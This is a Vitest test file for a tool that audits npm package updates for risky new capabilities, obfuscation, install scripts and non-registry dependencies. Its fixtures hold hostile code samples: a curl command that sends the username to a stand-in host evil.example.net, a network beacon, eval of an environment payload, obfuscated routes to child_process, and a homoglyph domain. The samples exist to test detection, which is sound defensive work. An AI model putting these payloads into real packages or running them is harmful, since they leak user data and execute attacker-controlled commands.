import { mkdir, readFile, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { afterEach, describe, expect, it } from 'vitest';
import { audit } from '../src/audit.js';
import { __test, analyzeDiff, shannonEntropy } from '../src/analyzer.js';
import { DEFAULT_LIMITS } from '../src/constants.js';
import type { FileSummary, LoadedFile, LoadedPackage, PackageMetadata } from '../src/types.js';

const projectRoot = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
const safe = path.join(projectRoot, 'fixtures', 'safe-v1');
const risky = path.join(projectRoot, 'fixtures', 'risky-v2');
const temporaryPaths: string[] = [];

/** Byte-identical payloads reused across the coverage regressions. */
const MALICIOUS_BODY = [
  "const cp = require('child_process');",
  "const https = require('https');",
  "cp.execSync('curl http://evil.example.net/$(whoami)');",
  "https.get('http://evil.example.net/beacon');",
  'eval(process.env.PAYLOAD);',
  '',
].join('\n');
const MALICIOUS_ENTRY = `#!/usr/bin/env node\n${MALICIOUS_BODY}`;

afterEach(async () => {
  await Promise.all(temporaryPaths.splice(0).map((target) => rm(target, { recursive: true, force: true })));
});

describe('analyzeDiff', () => {
  it('surfaces the demo update capabilities with evidence', async () => {
    const report = await audit(safe, risky, { offline: true });
    const ids = new Set(report.findings.map((finding) => finding.id));

    expect(report.generatedAt).toBe('1970-01-01T00:00:00.000Z');
    expect(report.analysis.packageCodeExecuted).toBe(false);
    expect(ids).toContain('capability.added.child_process');
    expect(ids).toContain('capability.added.dynamic-code');
    expect(ids).toContain('capability.added.network');
    expect(ids).toContain('capability.added.filesystem');
    expect(ids).toContain('network.domains.added');
    expect(ids).toContain('install-script.added');
    expect(ids).toContain('binary.native.added');
    expect(ids).toContain('metadata.maintainers.changed');
    expect(ids).toContain('obfuscation.encoded-payload');
    expect(report.findings.every((finding) => finding.evidence.length > 0)).toBe(true);
    expect(report.risk.level).toBe('critical');
    expect(report.risk.score).toBe(100);
  });

  it('produces stable fingerprints and deterministic reports offline', async () => {
    const first = await audit(safe, risky, { offline: true });
    const second = await audit(safe, risky, { offline: true });
    expect(second.findings.map((finding) => finding.fingerprint)).toEqual(first.findings.map((finding) => finding.fingerprint));
    expect(second).toEqual(first);
  });

  it('reports no risk when comparing a directory with itself', async () => {
    const report = await audit(safe, safe, { offline: true });
    expect(report.findings).toEqual([]);
    expect(report.risk).toMatchObject({ score: 0, level: 'none', newFindings: 0 });
    expect(report.inventory).toMatchObject({ added: [], removed: [], modified: [] });
    expect(report.inventory.unchanged).toBeGreaterThan(0);
  });

  it('does not execute package scripts during analysis', async () => {
    const directory = await makePackage({
      'package.json': JSON.stringify({
        name: 'execution-sentinel', version: '1.0.0',
        scripts: { postinstall: 'node payload.js' },
      }),
      'payload.js': "require('node:fs').writeFileSync('EXECUTED', 'bad')",
    });
    const clean = await makePackage({ 'package.json': JSON.stringify({ name: 'execution-sentinel', version: '0.9.0' }) });
    await audit(clean, directory, { offline: true });
    await expect(readFile(path.join(directory, 'EXECUTED'), 'utf8')).rejects.toMatchObject({ code: 'ENOENT' });
  });

  it('recognizes popular HTTP clients and dynamic require paths as new capabilities', async () => {
    const before = await makePackage({
      'package.json': JSON.stringify({ name: 'client-signals', version: '1.0.0' }),
      'index.js': 'export const value = 1;',
    });
    const after = await makePackage({
      'package.json': JSON.stringify({ name: 'client-signals', version: '1.1.0' }),
      'index.js': "import axios from 'axios'; axios.post('/collect'); const plugin = require(process.env.PLUGIN);",
    });
    const report = await audit(before, after, { offline: true });
    expect(report.findings.map((finding) => finding.id)).toEqual(expect.arrayContaining([
      'capability.added.network',
      'capability.added.module-loader',
    ]));
  });

  it('reports changed native binaries, executable transitions, and symlink targets', () => {
    const before = syntheticPackage('1.0.0', {
      'addon.node': syntheticFile('addon.node', 'a'.repeat(64), 0o644, 'binary'),
      'script.sh': syntheticFile('script.sh', 'b'.repeat(64), 0o644, 'text'),
      link: syntheticFile('link', 'c'.repeat(64), 0o777, 'symlink'),
    });
    const after = syntheticPackage('1.1.0', {
      'addon.node': syntheticFile('addon.node', 'd'.repeat(64), 0o644, 'binary'),
      'script.sh': syntheticFile('script.sh', 'b'.repeat(64), 0o755, 'text'),
      link: syntheticFile('link', 'e'.repeat(64), 0o777, 'symlink'),
    });
    const report = analyzeDiff(before, after, {
      generatedAt: '1970-01-01T00:00:00.000Z',
      offline: true,
      resolveOptions: {
        offline: true, registry: 'https://registry.npmjs.org/', cacheDir: '.cache', limits: DEFAULT_LIMITS,
        localIgnore: [], ignore: [],
      },
    });
    expect(report.findings.map((finding) => finding.id)).toEqual(expect.arrayContaining([
      'binary.native.changed',
      'files.executable.changed',
      'files.symlink.changed',
    ]));
  });

  it.each([
    ['extensionless bin entry', { bin: { acme: 'bin/acme' } }, 'bin/acme'],
    ['extensionless main entry', { main: 'lib/entry' }, 'lib/entry'],
    ['lifecycle script target', { scripts: { postinstall: 'node hooks/setup' } }, 'hooks/setup'],
  ])('analyzes a shipped code file selected by %s', async (_label, fields, target) => {
    const before = await makePackage({
      'package.json': JSON.stringify({ name: 'acme', version: '1.0.0', ...fields }),
      [target]: '#!/usr/bin/env node\nconsole.log(1);\n',
    });
    const after = await makePackage({
      'package.json': JSON.stringify({ name: 'acme', version: '1.1.0', ...fields }),
      [target]: MALICIOUS_ENTRY,
    });
    const report = await audit(before, after, { offline: true });
    expect(report.findings.map((finding) => finding.id)).toEqual(expect.arrayContaining([
      'capability.added.child_process',
      'capability.added.dynamic-code',
      'capability.added.network',
    ]));
    expect(report.risk.level).toBe('critical');
  });

  it('analyzes a shipped code file that only a JavaScript shebang identifies', async () => {
    const before = await makePackage({
      'package.json': JSON.stringify({ name: 'acme', version: '1.0.0' }),
      tool: '#!/usr/bin/env node\nconsole.log(1);\n',
    });
    const after = await makePackage({
      'package.json': JSON.stringify({ name: 'acme', version: '1.1.0' }),
      tool: MALICIOUS_ENTRY,
    });
    const report = await audit(before, after, { offline: true });
    expect(report.findings.map((finding) => finding.id)).toContain('capability.added.child_process');
  });

  it('does not parse a shell script as JavaScript even when the manifest points at it', async () => {
    const before = await makePackage({
      'package.json': JSON.stringify({ name: 'acme', version: '1.0.0', bin: { acme: 'bin/acme.sh' } }),
      'bin/acme.sh': '#!/bin/sh\necho one\n',
    });
    const after = await makePackage({
      'package.json': JSON.stringify({ name: 'acme', version: '1.1.0', bin: { acme: 'bin/acme.sh' } }),
      'bin/acme.sh': '#!/bin/sh\nfor value in a b; do echo "$value"; done\n',
    });
    const report = await audit(before, after, { offline: true });
    expect(report.findings.map((finding) => finding.id)).not.toContain('analysis.parse-failure');
  });

  it('fails closed when a shipped code file exceeds the analyzed-text limit', async () => {
    const before = await makePackage({
      'package.json': JSON.stringify({ name: 'acme', version: '1.0.0' }),
      'index.js': 'export const ok = 1;\n',
    });
    const after = await makePackage({
      'package.json': JSON.stringify({ name: 'acme', version: '1.1.0' }),
      'index.js': `${MALICIOUS_ENTRY}\n/*${'x'.repeat(400)}*/\n`,
    });
    const report = await audit(before, after, { offline: true, limits: { maxTextBytes: 256 } });
    const gap = report.findings.find((finding) => finding.id === 'analysis.unanalyzed-code');
    expect(gap?.severity).toBe('high');
    expect(gap?.evidence[0]?.file).toBe('index.js');
    expect(gap?.evidence[0]?.message).toMatch(/analyzed-text limit/);
    expect(report.risk.score).toBeGreaterThanOrEqual(25);
  });

  it('keeps lexical capabilities and reports the coverage loss when the parser fails', async () => {
    const before = await makePackage({
      'package.json': JSON.stringify({ name: 'acme', version: '1.0.0' }),
      'index.js': 'export const ok = 1;\n',
    });
    const after = await makePackage({
      'package.json': JSON.stringify({ name: 'acme', version: '1.1.0' }),
      'index.js': `const x = ${'('.repeat(900)}1${')'.repeat(900)};\n${MALICIOUS_BODY}`,
    });
    const report = await audit(before, after, { offline: true });
    const ids = report.findings.map((finding) => finding.id);
    expect(ids).toContain('analysis.parse-failure');
    expect(ids).toContain('capability.added.child_process');
    expect(ids).toContain('capability.added.network');
    expect(report.findings.find((finding) => finding.id === 'analysis.parse-failure')?.severity).toBe('high');
    expect(report.risk.level).toBe('critical');
  });

  it('parses a TypeScript legacy cast without forcing the conflicting jsx plugin', async () => {
    const before = await makePackage({
      'package.json': JSON.stringify({ name: 'acme', version: '1.0.0' }),
      'index.ts': 'export const ok = 1;\n',
    });
    const after = await makePackage({
      'package.json': JSON.stringify({ name: 'acme', version: '1.1.0' }),
      'index.ts': `const y: unknown = 1;\nconst z = <string>(y as unknown);\n${MALICIOUS_BODY}`,
    });
    const report = await audit(before, after, { offline: true });
    const ids = report.findings.map((finding) => finding.id);
    expect(ids).toContain('capability.added.child_process');
    expect(ids).not.toContain('analysis.parse-failure');
  });

  it('analyzes code whose control bytes defeat the text heuristic', async () => {
    const noise = String.fromCharCode(1).repeat(600);
    const before = await makePackage({
      'package.json': JSON.stringify({ name: 'acme', version: '1.0.0' }),
      'index.js': 'export const ok = 1;\n',
    });
    const after = await makePackage({
      'package.json': JSON.stringify({ name: 'acme', version: '1.1.0' }),
      'index.js': `/*${noise}*/\n${MALICIOUS_BODY}`,
    });
    const report = await audit(before, after, { offline: true });
    const ids = report.findings.map((finding) => finding.id);
    expect(ids).toContain('capability.added.child_process');
    expect(ids).toContain('obfuscation.control-bytes');
    expect(report.risk.level).toBe('critical');
  });

  it.each([
    ['a member-expression require', "const cp = process.mainModule.require('child_process');\ncp.execSync('id');\n"],
    ['the internal module loader', "const cp = module.constructor._load('child_process');\ncp.execSync('id');\n"],
    ['a computed loader property', "const cp = globalThis['req' + 'uire']('child_process');\ncp.execSync('id');\n"],
  ])('resolves child_process reached through %s', async (_label, body) => {
    const before = await makePackage({
      'package.json': JSON.stringify({ name: 'acme', version: '1.0.0' }),
      'index.js': 'export const ok = 1;\n',
    });
    const after = await makePackage({
      'package.json': JSON.stringify({ name: 'acme', version: '1.1.0' }),
      'index.js': body,
    });
    const report = await audit(before, after, { offline: true });
    expect(report.findings.map((finding) => finding.id)).toContain('capability.added.child_process');
  });

  it('flags a code constructor reached through an alias', async () => {
    const before = await makePackage({
      'package.json': JSON.stringify({ name: 'acme', version: '1.0.0' }),
      'index.js': 'export const ok = 1;\n',
    });
    const after = await makePackage({
      'package.json': JSON.stringify({ name: 'acme', version: '1.1.0' }),
      'index.js': 'const F = (() => {}).constructor;\nF("return process.env")();\n',
    });
    const report = await audit(before, after, { offline: true });
    expect(report.findings.map((finding) => finding.id)).toContain('capability.added.dynamic-code');
  });

  it('records an internationalized host so a domain policy can match it', async () => {
    const before = await makePackage({
      'package.json': JSON.stringify({ name: 'acme', version: '1.0.0' }),
      'index.js': "fetch('https://good-corp.com/a');\n",
    });
    const after = await makePackage({
      'package.json': JSON.stringify({ name: 'acme', version: '1.1.0' }),
      // Cyrillic "е" (U+0435) renders like ASCII "e" but is a different host.
      'index.js': "fetch('https://good-corp.com/a');\nfetch('https://еvil-corp.com/collect');\n",
    });
    const report = await audit(before, after, { offline: true });
    const domains = report.findings.find((finding) => finding.id === 'network.domains.added');
    expect(domains).toBeDefined();
    expect(JSON.stringify(domains)).toContain('еvil-corp.com');
  });

  it('does not let capability names in comments or strings suppress the real capability', async () => {
    const poison = [
      '// Never use eval() in this package.',
      'const doc = "do not call require(\'child_process\') here";',
      'const note = "process.env is never read";',
      'const client = "fetch() is not used";',
      'export const ok = 1;',
    ].join('\n');
    const clean = await makePackage({
      'package.json': JSON.stringify({ name: 'acme', version: '1.0.0' }),
      'index.js': 'export const ok = 1;\n',
    });
    const poisoned = await makePackage({
      'package.json': JSON.stringify({ name: 'acme', version: '1.0.0' }),
      'index.js': poison,
    });
    const after = await makePackage({
      'package.json': JSON.stringify({ name: 'acme', version: '1.1.0' }),
      'index.js': MALICIOUS_BODY,
    });
    const expected = ['capability.added.child_process', 'capability.added.dynamic-code', 'capability.added.network', 'capability.added.environment'];
    expect((await audit(clean, after, { offline: true })).findings.map((finding) => finding.id)).toEqual(expect.arrayContaining(expected));
    expect((await audit(poisoned, after, { offline: true })).findings.map((finding) => finding.id)).toEqual(expect.arrayContaining(expected));
  });

  it('does not raise a capability finding for a capability named only in a comment', async () => {
    const before = await makePackage({
      'package.json': JSON.stringify({ name: 'acme', version: '1.0.0' }),
      'index.js': 'export const ok = 1;\n',
    });
    const after = await makePackage({
      'package.json': JSON.stringify({ name: 'acme', version: '1.1.0' }),
      'index.js': '// Do not use eval() or require("child_process") here.\nexport const ok = 2;\n',
    });
    const report = await audit(before, after, { offline: true });
    expect(report.findings.filter((finding) => finding.id.startsWith('capability.added.'))).toEqual([]);
  });

  it('changes capability fingerprints when behavior changes in the same file', async () => {
    const before = await makePackage({
      'package.json': JSON.stringify({ name: 'fingerprint-test', version: '1.0.0' }),
      'index.js': 'export const ok = true;',
    });
    const reviewed = await makePackage({
      'package.json': JSON.stringify({ name: 'fingerprint-test', version: '1.1.0' }),
      'index.js': "require('node:child_process').execFile('/usr/bin/convert', ['safe.png']);",
    });
    const changed = await makePackage({
      'package.json': JSON.stringify({ name: 'fingerprint-test', version: '1.2.0' }),
      'index.js': "require('node:child_process').exec(process.env.ATTACKER_COMMAND);",
    });
    const first = (await audit(before, reviewed, { offline: true })).findings.find((finding) => finding.id === 'capability.added.child_process');
    const second = (await audit(before, changed, { offline: true })).findings.find((finding) => finding.id === 'capability.added.child_process');
    expect(first?.fingerprint).toBeDefined();
    expect(second?.fingerprint).toBeDefined();
    expect(second?.fingerprint).not.toBe(first?.fingerprint);
  });

  it('raises a high-severity finding for a newly added non-registry dependency', async () => {
    const before = await makePackage({
      'package.json': JSON.stringify({ name: 'dependency-source', version: '1.0.0' }),
    });
    const after = await makePackage({
      'package.json': JSON.stringify({
        name: 'dependency-source',
        version: '1.1.0',
        optionalDependencies: { setup: 'github:reviewed/source#0123456789abcdef' },
      }),
    });
    const finding = (await audit(before, after, { offline: true })).findings.find(
      (entry) => entry.id === 'dependencies.non-registry.added',
    );
    expect(finding).toMatchObject({ severity: 'high', tags: ['dependency', 'non-registry'] });
  });

  it.each([
    'git+ssh://git@github.com/reviewed/source.git#0123456789abcdef',
    'file:../vendor/source',
    'ssh://git@example.test/reviewed/source.git#0123456789abcdef',
  ])('fails a high-severity policy when a registry dependency switches to %s', async (specifier) => {
    const before = await makePackage({
      'package.json': JSON.stringify({
        name: 'dependency-transition', version: '1.0.0', dependencies: { setup: '^1.2.3' },
      }),
    });
    const after = await makePackage({
      'package.json': JSON.stringify({
        name: 'dependency-transition', version: '1.1.0', dependencies: { setup: specifier },
      }),
    });
    const report = await audit(before, after, { offline: true, failOn: 'high' });
    const finding = report.findings.find((entry) => entry.id === 'dependencies.non-registry.changed');
    expect(finding).toMatchObject({ severity: 'high', tags: ['dependency', 'non-registry', 'changed'] });
    expect(finding?.evidence[0]?.message).toContain(`setup@^1.2.3 → ${specifier}`);
    expect(report.findings.map((entry) => entry.id)).not.toContain('dependencies.runtime.added');
    expect(report.policy.passed).toBe(false);
    expect(report.policy.violations.map((violation) => violation.rule)).toContain('failOn');
  });

  it('flags a changed non-registry source without treating it as a new dependency', async () => {
    const before = await makePackage({
      'package.json': JSON.stringify({
        name: 'dependency-transition', version: '1.0.0', dependencies: { setup: 'file:../vendor/v1' },
      }),
    });
    const after = await makePackage({
      'package.json': JSON.stringify({
        name: 'dependency-transition', version: '1.1.0', dependencies: { setup: 'git@github.com:reviewed/v2.git' },
      }),
    });
    const ids = (await audit(before, after, { offline: true })).findings.map((entry) => entry.id);
    expect(ids).toContain('dependencies.non-registry.changed');
    expect(ids).not.toContain('dependencies.non-registry.added');
    expect(ids).not.toContain('dependencies.runtime.added');
  });

  it('does not report a non-registry transition when a dependency returns to the registry', async () => {
    const before = await makePackage({
      'package.json': JSON.stringify({
        name: 'dependency-transition', version: '1.0.0', dependencies: { setup: 'file:../vendor/source' },
      }),
    });
    const after = await makePackage({
      'package.json': JSON.stringify({
        name: 'dependency-transition', version: '1.1.0', dependencies: { setup: '^1.2.3' },
      }),
    });
    expect((await audit(before, after, { offline: true })).findings.map((entry) => entry.id)).not.toContain(
      'dependencies.non-registry.changed',
    );
  });

  it.each([
    'git+ssh://git@github.com/reviewed/source.git#0123456',
    'git@github.com:reviewed/source.git#0123456',
    'ssh://git@example.test/source.git',
    'file:../vendor/source',
    '../vendor/source',
    '/opt/vendor/source',
    'C:\\vendor\\source',
    'C:vendor\\source',
    'D:foo.tgz',
    'workspace:*',
    'foo.tgz',
    'foo.tar.gz',
    'foo.tar',
  ])('classifies %s as a non-registry dependency source', (specifier) => {
    expect(__test.isNonRegistryDependencySpecifier(specifier)).toBe(true);
  });

  it.each(['npm:reviewed-source@1.2.3', '^1.2.3', '~1.2.3', '>=1.0.0', '1.2.3', 'latest', 'next'])('keeps %s in the registry-backed class', (specifier) => {
    expect(__test.isNonRegistryDependencySpecifier(specifier)).toBe(false);
  });
});

describe('entropy helper', () => {
  it('distinguishes uniform and varied byte distributions', () => {
    expect(shannonEntropy(Buffer.alloc(512, 1))).toBe(0);
    expect(shannonEntropy(Buffer.from(Array.from({ length: 256 }, (_, value) => value)))).toBeCloseTo(8, 5);
  });
});

async function makePackage(files: Record<string, string>): Promise<string> {
  const root = await import('node:fs/promises').then(({ mkdtemp }) => mkdtemp(path.join(tmpdir(), 'depdiff-test-')));
  temporaryPaths.push(root);
  for (const [relative, contents] of Object.entries(files)) {
    const destination = path.join(root, relative);
    await mkdir(path.dirname(destination), { recursive: true });
    await writeFile(destination, contents, 'utf8');
  }
  return root;
}

function syntheticFile(filePath: string, digest: string, mode: number, kind: FileSummary['kind']): LoadedFile {
  return { path: filePath, size: 1, sha256: digest, mode, modeKnown: true, kind };
}

function syntheticPackage(version: string, entries: Record<string, LoadedFile>): LoadedPackage {
  const packageMetadata: PackageMetadata = {
    name: 'synthetic-package', version, engines: {}, scripts: {}, dependencies: {}, optionalDependencies: {},
    peerDependencies: {}, devDependencies: {}, bundledDependencies: [], maintainers: [], entryPoints: [],
  };
  const files = new Map(Object.entries(entries));
  return {
    files,
    snapshot: {
      source: { input: 'synthetic', kind: 'directory', resolved: 'synthetic' },
      package: packageMetadata,
      files: [...files.values()].map((file) => ({
        path: file.path, size: file.size, sha256: file.sha256, mode: file.mode, modeKnown: file.modeKnown, kind: file.kind,
      })),
      totalBytes: files.size,
    },
  };
}
